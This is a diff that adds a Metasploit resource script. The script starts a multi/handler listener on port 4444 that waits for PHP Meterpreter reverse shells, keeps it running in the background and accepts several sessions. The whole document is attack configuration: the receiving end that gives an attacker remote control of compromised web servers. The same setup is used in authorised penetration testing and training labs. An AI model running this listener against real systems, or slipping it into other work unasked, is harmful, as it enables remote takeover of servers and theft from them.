@@ -1,0 +1,9 @@
+# Metasploit Resource Script: Multi/Handler Listener
+# Usage: msfconsole -q -r metasploit_handler.rc
+
+use exploit/multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
